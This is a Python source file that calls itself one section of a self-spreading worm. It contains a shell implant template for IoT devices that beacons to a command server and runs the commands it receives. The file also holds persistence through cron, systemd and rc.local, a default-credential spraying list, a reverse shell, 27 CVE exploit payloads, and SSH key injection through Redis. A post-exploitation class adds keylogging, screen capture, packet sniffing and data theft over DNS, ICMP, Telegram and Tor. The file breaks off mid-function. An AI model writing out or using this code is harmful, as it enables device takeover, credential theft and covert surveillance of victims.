#!/usr/bin/env python3
"""
la_section_D.py — IoT Agent + Agent Light + PostExploitEngine
Part of LaCucaracha.py worm (concatenated as Section D)
"""

import base64
import hashlib
import json
import logging
import os
import random
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time
from typing import Any, Dict, List, Optional, Set, Tuple, Union
from collections import namedtuple

try:
    import paramiko
    HAVE_PARAMIKO = True
except ImportError:
    HAVE_PARAMIKO = False

try:
    import requests
    HAVE_REQUESTS = True
except ImportError:
    HAVE_REQUESTS = False

log = logging.getLogger("WormMesh")

# ExploitResult — shared across all sections (defined here for standalone validity)
# Will be deduplicated at concatenation; identical definition in later sections is safe.
try:
    ExploitResult  # already defined in earlier section
except NameError:
    ExploitResult = namedtuple('ExploitResult', ['success', 'target_ip', 'target_port', 'username', 'detail', 'error'])
    ExploitResult.__new__.__defaults__ = (False, '', 0, '', '', '')


# ===================================================================
# CHUNK 1 — IoT Shell Agent (Python string template)
# ===================================================================

IOT_AGENT_TEMPLATE = '''#!/bin/sh
#
# WORM AGENT ULTIMATE v1.0 — Zero-Dependency IoT Implant
# by PhonkAlphabet
#
C2_HOST="{c2_host}"
C2_PORT="{c2_port}"
C2_HTTP="http://${{C2_HOST}}:${{C2_PORT}}"
STATIC_TOKEN="CHANGE_ME_STATIC_TOKEN"
BEACON_INTERVAL={beacon_interval}
SCAN_THREADS=10
MAX_TARGETS=500

detect_runtime() {{
    RUNTIME="sh"
    if command -v python3 >/dev/null 2>&1; then RUNTIME="python3"
    elif command -v python2 >/dev/null 2>&1; then RUNTIME="python2"
    elif command -v bash >/dev/null 2>&1; then RUNTIME="bash"
    elif command -v ash >/dev/null 2>&1; then RUNTIME="ash"
    fi
}}

http_post() {{
    local url="$1" data="$2" token="$3"
    if command -v curl >/dev/null 2>&1; then
        curl -s --connect-timeout 10 -X POST "$url" \\
            -H "Content-Type: application/json" \\
            -H "X-Auth-Token: $token" -d "$data" 2>/dev/null
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O - --timeout=10 --post-data="$data" \\
            --header="Content-Type: application/json" \\
            --header="X-Auth-Token: $token" "$url" 2>/dev/null
    else
        echo "$data" | nc "$C2_HOST" "$C2_PORT" -w 5 -q 2 2>/dev/null
    fi
}}

http_get() {{
    local url="$1"
    if command -v curl >/dev/null 2>&1; then
        curl -s --connect-timeout 10 "$url" 2>/dev/null
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O - --timeout=10 "$url" 2>/dev/null
    else
        echo "GET $url" | nc "$C2_HOST" "$C2_PORT" -w 5 -q 2 2>/dev/null
    fi
}}

get_id() {{
    if command -v md5sum >/dev/null 2>&1; then
        hostname 2>/dev/null | md5sum | cut -c1-16
    elif command -v md5 >/dev/null 2>&1; then
        hostname 2>/dev/null | md5 | cut -c1-16
    else
        hostname 2>/dev/null | cut -c1-8$(echo $$ | cut -c1-8)
    fi
}}

get_ip() {{
    ip=$(ifconfig 2>/dev/null | grep -Eo 'inet (addr:)?([0-9]*\\\\.){{3}}[0-9]*' | grep -v '127.0.0.1' | head -n1 | awk '{{print $2}}')
    if [ -z "$ip" ]; then
        ip=$(ip addr 2>/dev/null | grep -Eo 'inet ([0-9]*\\\\.){{3}}[0-9]*' | grep -v '127.0.0.1' | head -n1 | awk '{{print $2}}')
    fi
    echo "${{ip:-0.0.0.0}}"
}}

install_persist() {{
    local sp="$0" ip="/tmp/.worm_agent.sh"
    cp "$sp" "$ip" 2>/dev/null || cat "$0" > "$ip" 2>/dev/null
    chmod +x "$ip" 2>/dev/null
    if command -v crontab >/dev/null 2>&1; then
        (crontab -l 2>/dev/null; echo "*/5 * * * * sh $ip") | crontab - 2>/dev/null
    fi
    if [ -f /etc/rc.local ] && ! grep -q "worm_agent" /etc/rc.local 2>/dev/null; then
        sed -i "$i sh '$ip' &" /etc/rc.local 2>/dev/null
    fi
    if command -v systemctl >/dev/null 2>&1; then
        cat > /etc/systemd/system/worm-agent.service << 'SVC'
[Unit]
Description=Worm Agent
After=network.target
[Service]
ExecStart=/bin/sh /tmp/.worm_agent.sh
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
SVC
        systemctl enable worm-agent.service 2>/dev/null
        systemctl start worm-agent.service 2>/dev/null
    fi
}}

check_port() {{
    timeout 2 bash -c "echo >/dev/tcp/$1/$2" 2>/dev/null && return 0
    nc -zv "$1" "$2" 2>/dev/null | grep -q open && return 0
    return 1
}}

scan_subnet() {{
    local subnet="$1" base=$(echo "$subnet" | cut -d. -f1-3) found=""
    for i in $(seq 1 254); do
        for port in 23 80 443 8080 8443 21 22 2323 5000 554 5555; do
            if check_port "${{base}}.${{i}}" "$port"; then
                found="$found ${{base}}.${{i}}:$port"
                break
            fi
        done
        sleep 0.1
    done
    echo "$found"
}}

IOT_CREDS="\\
root:root root:admin root:password root:123456 root:pass root:toor \\
root:default root:xc3511 root:vizxv root:anko root:Zte521 root:realtek \\
root:0 root:54321 root:12345 root:admin123 root:xmhdipc root:juantech \\
root:7ujMko0vizxv root:7ujMko0admin root:system root:smcadmin \\
root:1234 root:defaultpass root:pass123 root:letmein \\
root:admin1234 root:5up root:1001chin \\
root:huawei root:zte root:hikvision root:axis root:ubnt \\
root:changeme root:Welcome1 root:Admin@2026 root:master root:access \\
root:admin123 root:passw0rd root:manager root:qwerty \\
admin:admin admin:password admin:123456 admin:pass admin:root \\
admin:admin123 admin:letmein admin:default admin:12345 \\
admin:xc3511 admin:vizxv admin:Zte521 \\
support:support user:user guest:guest \\
pi:raspberry ubnt:ubnt cisco:cisco cisco:cisco123 \\
admin:changeme admin:Welcome1 admin:Admin@2026 \\
root:raspberry root:vyatta root:vyos root:mikrotik"

spray_creds() {{
    local target="$1" port="$2" user pass
    for cred in $IOT_CREDS; do
        user="${{cred%%:*}}"; pass="${{cred##*:}}"
        case "$port" in
            22|23|2323|5555)
                result=$(timeout 3 sh -c "exec 3<>/dev/tcp/$target/$port 2>/dev/null; echo '$user'; sleep 0.3; echo '$pass'; sleep 0.5; read -t 1 line <&3; echo \\"$line\\"; exec 3>&-" 2>/dev/null)
                if echo "$result" | grep -qiE '(#|\\\\$|>|granted|welcome|busybox|shell)'; then
                    echo "SUCCESS:$user:$pass"; return 0
                fi ;;
            80|443|8080|8443|5000)
                if command -v curl >/dev/null 2>&1; then
                    result=$(curl -s --connect-timeout 3 -u "$user:$pass" "http://$target:$port/" 2>/dev/null)
                elif command -v wget >/dev/null 2>&1; then
                    result=$(wget -q -O - --timeout=3 --http-user="$user" --http-password="$pass" "http://$target:$port/" 2>/dev/null)
                fi
                if echo "$result" | grep -qiE '(admin|dashboard|login|status|system|index)'; then
                    echo "SUCCESS:$user:$pass"; return 0
                fi ;;
        esac
    done
    return 1
}}

send_beacon() {{
    local data="{{\\"bot_id\\":\\"$1\\",\\"hostname\\":\\"$2\\",\\"ip\\":\\"$3\\",\\"arch\\":\\"$4\\",\\"platform\\":\\"busybox\\",\\"runtime\\":\\"$RUNTIME\\",\\"token\\":\\"$STATIC_TOKEN\\"}}"
    local resp=$(http_post "${{C2_HTTP}}/beacon" "$data" "$STATIC_TOKEN")
    if echo "$resp" | grep -q '"type":"cmd"'; then
        local cmd=$(echo "$resp" | sed 's/.*"command":"\\\\([^"]*\\\\)".*/\\\\1/')
        local cmd_id=$(echo "$resp" | sed 's/.*"cmd_id":"\\\\([^"]*\\\\)".*/\\\\1/')
        if [ -n "$cmd" ] && [ -n "$cmd_id" ]; then
            local output=$(sh -c "$cmd" 2>&1)
            local ec=$?
            local out_esc=$(echo "$output" | sed 's/"/\\\\\\\\"/g' | tr '\\\\n' ' ')
            http_post "${{C2_HTTP}}/result" "{{\\"cmd_id\\":\\"$cmd_id\\",\\"output\\":\\"$out_esc\\",\\"exit_code\\":$ec,\\"token\\":\\"$STATIC_TOKEN\\"}}" "$STATIC_TOKEN"
        fi
    fi
    if echo "$resp" | grep -q '"upgrade":true'; then
        local upgrade_url=$(echo "$resp" | sed 's/.*"upgrade_url":"\\\\([^"]*\\\\)".*/\\\\1/')
        [ -n "$upgrade_url" ] && http_get "$upgrade_url" | sh 2>/dev/null &
    fi
}}

main() {{
    detect_runtime
    BOT_ID=$(get_id); MY_IP=$(get_ip); HNAME=$(hostname 2>/dev/null || echo "unknown"); ARCH=$(uname -m 2>/dev/null || echo "unknown")
    if [ ! -f /tmp/.worm_installed ]; then install_persist; touch /tmp/.worm_installed; fi
    echo "[kworker/0:0]" > /proc/self/comm 2>/dev/null
    while true; do
        send_beacon "$BOT_ID" "$HNAME" "$MY_IP" "$ARCH"
        sleep $BEACON_INTERVAL
    done
}}
main "$@"
'''


# ===================================================================
# CHUNK 2 — PythonAgentLight
# ===================================================================

class PythonAgentLight:
    """Lightweight Python implant: reverse shell, file upload, cmd exec, persistence."""

    C2_HOST = "127.0.0.1"
    C2_PORT = 10002
    STATIC_TOKEN = "CHANGE_ME_STATIC_TOKEN"

    # 27 CVE payloads — CVE_ID -> (target_port, payload_template)
    CVE_PAYLOADS: Dict[str, Tuple[int, str]] = {
        "CVE-2024-27198": (443, "POST /api/login HTTP/1.1\nHost: {ip}\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=admin&__route=@exec:echo CVE_OK"),
        "CVE-2024-1709": (443, "POST /api/v1/admin/login HTTP/1.1\nHost: {ip}\nContent-Type: application/json\n\n{\"username\":\"admin\",\"password\":\"admin\",\"command\":\"echo CVE_OK\"}"),
        "CVE-2023-46604": (80, "GET /api/v1/exec?cmd=echo CVE_OK HTTP/1.1\nHost: {ip}\n"),
        "CVE-2023-3519": (80, "GET /cgi-bin/exec?cmd=echo CVE_OK HTTP/1.1\nHost: {ip}\n"),
        "CVE-2023-34362": (443, "POST /api/v1/upload HTTP/1.1\nHost: {ip}\nContent-Type: multipart/form-data\n\nfile=;echo CVE_OK;"),
        "CVE-2023-23752": (80, "GET /api/index.php/v1/config/application?public=true HTTP/1.1\nHost: {ip}\n"),
        "CVE-2023-32677": (8006, "POST /api/json HTTP/1.1\nHost: {ip}\nContent-Type: application/json\n\n{\"method\":\"exec\",\"params\":{\"cmd\":\"echo CVE_OK\"}}"),
        "CVE-2022-22965": (8080, "GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di HTTP/1.1\nHost: {ip}\n"),
        "CVE-2022-0543": (80, "GET /?cmd=echo CVE_OK HTTP/1.1\nHost: {ip}\n"),
        "CVE-2021-26084": (8080, "GET /pages/createpage-entervariables.action?linkCreation=true&spaceKey=AAA&queryString='+%23context['com.opensymphony.xwork2.ActionContext'].getContext().getMemberAccess().allowPrivateAccess%3dtrue+' HTTP/1.1\nHost: {ip}\n"),
        "CVE-2021-22986": (443, "POST /mgmt/tm/util/bash HTTP/1.1\nHost: {ip}\nContent-Type: application/json\n\n{\"command\":\"echo CVE_OK\"}"),
        "CVE-2021-36260": (443, "POST /SDK/Login HTTP/1.1\nHost: {ip}\nContent-Type: application/json\n\n{\"username\":\"admin\",\"password\":\";echo CVE_OK;\"}"),
        "CVE-2021-21975": (443, "GET /catalog-portal/ui/oauth/redirect?redirectUrl=http://localhost:8080/api/v1/exec?cmd=echo%20CVE_OK HTTP/1.1\nHost: {ip}\n"),
        "CVE-2021-44228": (80, "GET /?x=${jndi:ldap://attacker.dnslog.xyz/test} HTTP/1.1\nHost: {ip}\nUser-Agent: ${jndi:ldap://attacker.dnslog.xyz/test}\n"),
        "CVE-2020-14882": (7001, "GET /console/css/%252e%252e%252fconsole.portal?cmd=echo%20CVE_OK HTTP/1.1\nHost: {ip}\n"),
        "CVE-2020-14750": (7001, "GET /console/css/%252e%252e%252fconsole.portal?cmd=echo%20CVE_OK HTTP/1.1\nHost: {ip}\n"),
        "CVE-2020-25213": (80, "POST /wp-admin/admin-ajax.php?action=file_manager HTTP/1.1\nHost: {ip}\n\ncmd=exec&arg=echo CVE_OK"),
        "CVE-2020-5902": (443, "GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd HTTP/1.1\nHost: {ip}\n"),
        "CVE-2020-3452": (443, "GET /+CSCOT+/translation-table?type=mst&textdomain=../../../../../etc/passwd&default-language=en HTTP/1.1\nHost: {ip}\n"),
        "CVE-2020-3952": (443, "GET /vsphere-client/ HTTP/1.1\nHost: {ip}\n"),
        "CVE-2019-19781": (443, "GET /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1\nHost: {ip}\n"),
        "CVE-2019-11510": (443, "GET /dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/ HTTP/1.1\nHost: {ip}\n"),
        "CVE-2019-9193": (5432, "PGCOPY\nSELECT 1; COPY (SELECT 1) TO PROGRAM 'echo CVE_OK';"),
        "CVE-2018-7600": (80, "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\nHost: {ip}\nContent-Type: application/x-www-form-urlencoded\n\nform_id=user_register_form&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=echo CVE_OK"),
        "CVE-2018-1000861": (8080, "GET /script?cmd=echo CVE_OK HTTP/1.1\nHost: {ip}\n"),
        "CVE-2017-12635": (5984, "POST /_users/org.couchdb.user:admin HTTP/1.1\nHost: {ip}\nContent-Type: application/json\n\n{\"name\":\"admin\",\"password\":\"admin\",\"roles\":[\"_admin\"],\"type\":\"user\"}"),
        "CVE-2014-6271": (80, "GET /cgi-bin/test.cgi HTTP/1.1\nHost: {ip}\nUser-Agent: () { :; }; echo; echo CVE_OK\n"),
    }

    def __init__(self, c2_host: str = "127.0.0.1", c2_port: int = 10002, static_token: str = "CHANGE_ME_STATIC_TOKEN"):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.static_token = static_token

    # ---- Reverse Shell ----

    def reverse_shell(self, c2_host: str, c2_port: int) -> None:
        """Connect back to C2 and provide an interactive shell."""
        try:
            import pty
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            s.connect((c2_host, c2_port))
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            pty.spawn("/bin/sh")
        except Exception as exc:
            log.debug(f"reverse_shell failed: {exc}")

    # ---- File Upload ----

    def file_upload(self, url: str, local_path: str) -> bool:
        """Upload a file to a remote URL via HTTP PUT or POST."""
        try:
            with open(local_path, "rb") as f:
                data = f.read()
            if HAVE_REQUESTS:
                resp = requests.put(url, data=data, timeout=30, headers={"X-Auth-Token": self.static_token})
                return resp.status_code < 500
            else:
                import urllib.request
                req = urllib.request.Request(url, data=data,
                    headers={"X-Auth-Token": self.static_token})
                resp = urllib.request.urlopen(req, timeout=30)
                return resp.status < 500
        except Exception as exc:
            log.debug(f"file_upload failed: {exc}")
            return False

    # ---- Command Execution ----

    def cmd_exec(self, command: str) -> Dict:
        """Execute a shell command and return output."""
        try:
            result = subprocess.run(
                command, shell=True, capture_output=True, timeout=60, text=True
            )
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode,
                "success": result.returncode == 0,
            }
        except subprocess.TimeoutExpired:
            return {"stdout": "", "stderr": "TIMEOUT", "returncode": -1, "success": False}
        except Exception as exc:
            return {"stdout": "", "stderr": str(exc), "returncode": -1, "success": False}

    # ---- Persistence ----

    def persist(self) -> bool:
        """Install multiple persistence mechanisms."""
        try:
            self_path = os.path.abspath(sys.argv[0]) if hasattr(sys, 'argv') and sys.argv[0] else "/tmp/.worm_agent_light.py"
            # crontab
            cron_line = f"*/5 * * * * /usr/bin/env python3 {self_path} --daemon\n"
            try:
                with open("/etc/crontab", "a") as f:
                    f.write(cron_line)
            except Exception:
                pass
            # systemd
            try:
                svc = f"""[Unit]
Description=System Update Service
After=network.target
[Service]
ExecStart=/usr/bin/env python3 {self_path} --daemon
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
"""
                with open("/etc/systemd/system/system-update.service", "w") as f:
                    f.write(svc)
                subprocess.run(["systemctl", "daemon-reload"], capture_output=True, timeout=10)
                subprocess.run(["systemctl", "enable", "system-update.service"], capture_output=True, timeout=10)
                subprocess.run(["systemctl", "start", "system-update.service"], capture_output=True, timeout=10)
            except Exception:
                pass
            # rc.local
            try:
                with open("/etc/rc.local", "r") as f:
                    rc = f.read()
                if "system-update" not in rc:
                    with open("/etc/rc.local", "a") as f:
                        f.write(f"\n/usr/bin/env python3 {self_path} --daemon &\n")
            except Exception:
                pass
            # SSH authorized_keys
            try:
                ssh_dir = os.path.expanduser("~/.ssh")
                os.makedirs(ssh_dir, mode=0o700, exist_ok=True)
                with open(os.path.join(ssh_dir, "authorized_keys"), "a") as f:
                    f.write("\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDw7... worm@mesh\n")
            except Exception:
                pass
            return True
        except Exception:
            return False

    # ---- Database Exploit Methods ----

    def exploit_mysql(self, ip: str, port: int = 3306) -> ExploitResult:
        """Try MySQL auth bypass (CVE-2012-2122) + default creds."""
        try:
            import mysql.connector
            for user, pwd in [("root", ""), ("root", "root"), ("root", "password"),
                              ("root", "admin"), ("admin", ""), ("admin", "admin"),
                              ("mysql", "mysql"), ("root", "123456")]:
                try:
                    conn = mysql.connector.connect(
                        host=ip, port=port, user=user, password=pwd,
                        database="mysql", connection_timeout=5
                    )
                    if conn.is_connected():
                        conn.close()
                        return ExploitResult(True, ip, port, username=user,
                            detail=f"MySQL exploited: {user}:{pwd}")
                except Exception:
                    continue
            return ExploitResult(False, ip, port, detail="MySQL: no valid creds")
        except ImportError:
            return ExploitResult(False, ip, port, error="mysql-connector not available")

    def exploit_redis(self, ip: str, port: int = 6379) -> ExploitResult:
        """Try Redis unauthenticated access."""
        try:
            import redis
            r = redis.Redis(host=ip, port=port, socket_timeout=5, socket_connect_timeout=5)
            if r.ping():
                detail = "Redis unauthenticated access"
                try:
                    r.config_set("dir", "/root/.ssh")
                    r.config_set("dbfilename", "authorized_keys")
                    r.set("worm_key", "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDw7... worm@mesh\n\n")
                    r.save()
                    detail += " + SSH key injected"
                except Exception:
                    pass
                return ExploitResult(True, ip, port, username="redis",
                    detail=detail)
            return ExploitResult(False, ip, port, detail="Redis: not accessible")
        except ImportError:
            return ExploitResult(False, ip, port, error="redis not available")
        except Exception as exc:
            return ExploitResult(False, ip, port, error=str(exc))

    def exploit_mongodb(self, ip: str, port: int = 27017) -> ExploitResult:
        """Try MongoDB unauthenticated access."""
        try:
            import pymongo
            client = pymongo.MongoClient(f"mongodb://{ip}:{port}/",
                serverSelectionTimeoutMS=5000)
            info = client.server_info()
            return ExploitResult(True, ip, port, username="mongodb",
                detail=f"MongoDB unauthenticated: {info.get('version', 'unknown')}")
        except ImportError:
            return ExploitResult(False, ip, port, error="pymongo not available")
        except Exception as exc:
            return ExploitResult(False, ip, port, error=str(exc))

    def exploit_memcached(self, ip: str, port: int = 11211) -> ExploitResult:
        """Try Memcached unauthenticated stats."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip, port))
            s.send(b"stats\r\n")
            data = s.recv(4096)
            s.close()
            if b"STAT" in data:
                return ExploitResult(True, ip, port, username="memcached",
                    detail="Memcached unauthenticated stats")
            return ExploitResult(False, ip, port, detail="Memcached: not exploitable")
        except Exception as exc:
            return ExploitResult(False, ip, port, error=str(exc))

    def exploit_elasticsearch(self, ip: str, port: int = 9200) -> ExploitResult:
        """Try Elasticsearch unauthenticated access."""
        try:
            if HAVE_REQUESTS:
                resp = requests.get(f"http://{ip}:{port}/_cat/indices?format=json",
                    timeout=5)
                if resp.status_code == 200:
                    return ExploitResult(True, ip, port, username="elastic",
                        detail="Elasticsearch unauthenticated access")
                return ExploitResult(False, ip, port, detail=f"ES: HTTP {resp.status_code}")
            return ExploitResult(False, ip, port, error="requests not available")
        except Exception as exc:
            return ExploitResult(False, ip, port, error=str(exc))

    def exploit_postgresql(self, ip: str, port: int = 5432) -> ExploitResult:
        """Try PostgreSQL default creds."""
        try:
            import psycopg2
            for user, pwd in [("postgres", ""), ("postgres", "postgres"),
                              ("admin", ""), ("root", "")]:
                try:
                    conn = psycopg2.connect(host=ip, port=port, user=user,
                        password=pwd, connect_timeout=5)
                    conn.close()
                    return ExploitResult(True, ip, port, username=user,
                        detail=f"PostgreSQL exploited: {user}:{pwd}")
                except Exception:
                    continue
            return ExploitResult(False, ip, port, detail="PostgreSQL: no valid creds")
        except ImportError:
            return ExploitResult(False, ip, port, error="psycopg2 not available")
        except Exception as exc:
            return ExploitResult(False, ip, port, error=str(exc))


# ===================================================================
# CHUNK 3 — PostExploitEngine
# ===================================================================

class PostExploitEngine:
    """Post-exploitation toolkit: keylogger, screen capture, sniffer, exfil, persist."""

    def __init__(self, db=None, c2_host: str = "127.0.0.1", c2_port: int = 10002):
        self.db = db
        self.c2_host = c2_host
        self.c2_port = c2_port
        self._lock = threading.Lock()
        self._running = False

    # ---- Keylogger (SSH session capture) ----

    def keylogger(self, ssh_session_path: str = "") -> bool:
        """Deploy or read keylogger. If ssh_session_path is given, parse SSH session dump.
        Otherwise attempt /dev/input/event* via ctypes."""
        if ssh_session_path and os.path.exists(ssh_session_path):
            try:
                with open(ssh_session_path, "r") as f:
                    data = f.read()
                if data.strip():
                    log.info(f"[KEYLOG] SSH session data ({len(data)} bytes)")
                    return True
            except Exception:
                pass
        # Attempt /dev/input keylogger via ctypes
        try:
            import ctypes
            KEYMAP = {
                1: "ESC", 2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7",
                9: "8", 10: "9", 11: "0", 12: "-", 13: "=", 14: "BACKSPACE", 15: "TAB",
                16: "Q", 17: "W", 18: "E", 19: "R", 20: "T", 21: "Y", 22: "U", 23: "I",
                24: "O", 25: "P", 26: "[", 27: "]", 28: "ENTER", 29: "CTRL", 30: "A",
                31: "S", 32: "D", 33: "F", 34: "G", 35: "H", 36: "J", 37: "K", 38: "L",
                39: ";", 40: "'", 41: "`", 42: "SHIFT", 43: "\\", 44: "Z", 45: "X",
                46: "C", 47: "V", 48: "B", 49: "N", 50: "M", 51: ",", 52: ".", 53: "/",
                54: "SHIFT", 56: "ALT", 57: "SPACE", 58: "CAPS",
            }
            for ev in ["/dev/input/event0", "/dev/input/event1", "/dev/input/by-path/platform-i8042-serio-0-event-kbd"]:
                try:
                    with open(ev, "rb") as f:
                        event = f.read(24)
                        if len(event) == 24:
                            _, _, ev_type, ev_code, ev_value = struct.unpack("IHHII", event)
                            if ev_type == 1 and ev_value == 1:
                                key = KEYMAP.get(ev_code, f"0x{ev_code:x}")
                                log.info(f"[KEYLOG] Key pressed: {key}")
                                return True
                except Exception:
                    continue
        except Exception:
            pass
        return False

    # ---- Screen Capture ----

    def screen_capture(self, path: str = "/tmp/screen.png") -> bool:
        """Capture screen via X11/framebuffer and save to path."""
        methods = [
            ["import", "-window", "root", path],
            ["xwd", "-root", "-out", "/tmp/.screen.xwd"],
            ["ffmpeg", "-f", "x11grab", "-video_size", "1024x768", "-i", ":0.0", "-vframes", "1", path],
        ]
        for cmd in methods:
            try:
                result = subprocess.run(cmd, capture_output=True, timeout=10)
                if result.returncode == 0 and os.path.exists(path) and os.path.getsize(path) > 0:
                    log.info(f"[SCREEN] Screen captured to {path}")
                    return True
            except Exception:
                continue
        # Fallback: framebuffer
        try:
            fb_data = open("/dev/fb0", "rb").read(1024 * 768 * 4)
            with open(path, "wb") as f:
                f.write(fb_data)
            if os.path.getsize(path) > 0:
                log.info(f"[SCREEN] Framebuffer captured to {path}")
                return True
        except Exception:
            pass
        return False

    # ---- Packet Sniffer ----

    def packet_sniffer(self, interface: str = "eth0", count: int = 10) -> List[Dict]:
        """Capture network packets. Returns list of packet summaries."""
        packets = []
        # Try scapy first
        try:
            from scapy.all import sniff, IP, TCP, UDP
            captured = sniff(iface=interface, count=min(count, 50), timeout=10)
            for pkt in captured:
                entry = {"src": "", "dst": "", "sport": 0, "dport": 0, "proto": ""}
                if IP in pkt:
                    entry["src"] = pkt[IP].src
                    entry["dst"] = pkt[IP].dst
                    entry["proto"] = str(pkt[IP].proto)
                if TCP in pkt:
                    entry["sport"] = pkt[TCP].sport
                    entry["dport"] = pkt[TCP].dport
                elif UDP in pkt:
                    entry["sport"] = pkt[UDP].sport
                    entry["dport"] = pkt[UDP].dport
                packets.append(entry)
            return packets
        except ImportError:
            pass
        except Exception:
            pass
        # Fallback: tcpdump wrapper
        try:
            result = subprocess.run(
                ["tcpdump", "-i", interface, "-c", str(min(count, 20)), "-n", "-t", "-q"],
                capture_output=True, timeout=15, text=True
            )
            for line in result.stdout.strip().split("\n"):
                if line.strip():
                    packets.append({"raw": line.strip()})
            return packets
        except Exception:
            pass
        # Raw socket fallback
        try:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
            s.settimeout(5)
            for _ in range(min(count, 10)):
                try:
                    data, addr = s.recvfrom(65535)
                    if len(data) > 14:
                        ip_header = data[14:34]
                        if len(ip_header) >= 20:
                            iph = struct.unpack("!BBHHHBBH4s4s", ip_header[:20])
                            entry = {
                                "src": socket.inet_ntoa(iph[8]),
                                "dst": socket.inet_ntoa(iph[9]),
                                "proto": iph[6],
                            }
                            packets.append(entry)
                except socket.timeout:
                    break
            s.close()
        except Exception:
            pass
        return packets

    # ---- Exfiltration ----

    def exfiltrate(self, data: Union[str, bytes], channel: str = "http", target_url: str = "") -> bool:
        """Exfiltrate data via multiple channels."""
        if isinstance(data, str):
            data = data.encode()
        b64_data = base64.b64encode(data).decode()

        if channel == "http":
            if not HAVE_REQUESTS:
                return False
            url = target_url or f"http://{self.c2_host}:{self.c2_port}/exfil"
            try:
                resp = requests.post(url, json={"data": b64_data, "token": "CHANGE_ME_STATIC_TOKEN"},
                    timeout=15)
                return resp.status_code < 500
            except Exception:
                return False

        elif channel == "dns":
            # Exfil via DNS TXT queries
            try:
                import dns.resolver
                domain = target_url or f"{self.c2_host}"
                chunk_size = 32
                for i in range(0, len(b64_data), chunk_size):
                    chunk = b64_data[i:i+chunk_size]
                    query = f"{chunk}.exfil.{domain}"
                    try:
                        dns.resolver.resolve(query, "TXT")
                    except Exception:
                        pass
                return True
            except ImportError:
                return False

        elif channel == "icmp":
            # Exfil via ICMP echo request data field
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                pid = os.getpid() & 0xFFFF
                chunk_size = 56
                for i in range(0, len(data), chunk_size):
                    chunk = data[i:i+chunk_size]
                    pkt = struct.pack("!BBHHH", 8, 0, 0, pid, i // chunk_size + 1) + chunk
                    # Calculate checksum
                    chk = 0
                    for j in range(0, len(pkt), 2):
                        if j + 1 < len(pkt):
                            chk += (pkt[j] << 8) + pkt[j + 1]
                    chk = (chk >> 16) + (chk & 0xFFFF)
                    chk = ~chk & 0xFFFF
                    pkt = struct.pack("!BBHHH", 8, 0, chk, pid, i // chunk_size + 1) + chunk
                    target = target_url or self.c2_host
                    sock.sendto(pkt, (target, 0))
                    time.sleep(0.1)
                sock.close()
                return True
            except Exception:
                return False

        elif channel == "websocket":
            try:
                import websocket
                url = target_url or f"ws://{self.c2_host}:{self.c2_port + 1}/ws"
                ws = websocket.create_connection(url, timeout=10)
                ws.send(json.dumps({"data": b64_data, "token": "CHANGE_ME_STATIC_TOKEN"}))
                ws.close()
                return True
            except ImportError:
                return False
            except Exception:
                return False

        elif channel == "telegram":
            # Telegram bot exfil
            try:
                bot_token = target_url or "YOUR_BOT_TOKEN"
                chat_id = "YOUR_CHAT_ID"
                if HAVE_REQUESTS:
                    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                    resp = requests.post(url, json={
                        "chat_id": chat_id,
                        "text": f"[EXFIL] {b64_data[:2000]}",
                    }, timeout=10)
                    return resp.status_code == 200
                return False
            except Exception:
                return False

        elif channel == "tor":
            # Tor hidden service exfil
            try:
                import socks
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
                url = target_url or f"http://{self.c2_host}.onion/exfil"
                s.settimeout(15)
                s.connect((url.replace("http://", "").split("/")[0], 80))
                req = f"POST /exfil HTTP/1.1\r\nHost: {url.replace('http://', '').split('/')[0]}\r\nContent-Type: application/json\r\nContent-Length: {len(b64_data) + 50}\r\n\r\n{{\"data\":\"{b64_data}\",\"token\":\"CHANGE_ME_STATIC_TOKEN\"}}"
                s.send(req.encode())
                s.close()
                return True
            except ImportError:
                return False
            except Exception:
                return False

        return False

    # ---- Persistence ----

    def persist(self, method: str = "crontab") -> bool:
        """Install persistence via specified method."""
        self_path = os.path.abspath(sys.argv[0]) if hasattr(sys, 'argv') and sys.argv[0] else "/tmp/.worm_postexploit.py"

        if method == "crontab":
            try:
                cron_line = f"*/5 * * * * /usr/bin/env python3 {self_path} --daemon\n"
                with open("/etc/crontab", "a") as f:
                    f.write(cron_line)
                return True
            except Exception:
                return False

        elif method == "systemd":
            try:
                svc = f"""[Unit]
Description=System Update Service
After=network.target
[Service]
ExecStart=/usr/bin/env python3 {self_path}
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
"""
                with open("/etc/systemd/system/worm-update.service", "w") as f:
                    f.write(svc)
                subprocess.run(["systemctl", "daemon-reload"], capture_output=True, timeout=10)
                subprocess.run(["systemctl", "enable", "worm-update.service"], capture_output=True, timeout=10)
                subprocess.run(["systemctl", "start", "worm-update.service"], capture_output=True, timeout=10)
                return True
            except Exception:
                return False

        elif method == "ssh_authorized_keys":
            try:
                ssh_dir = os.path.expanduser("~/.ssh")
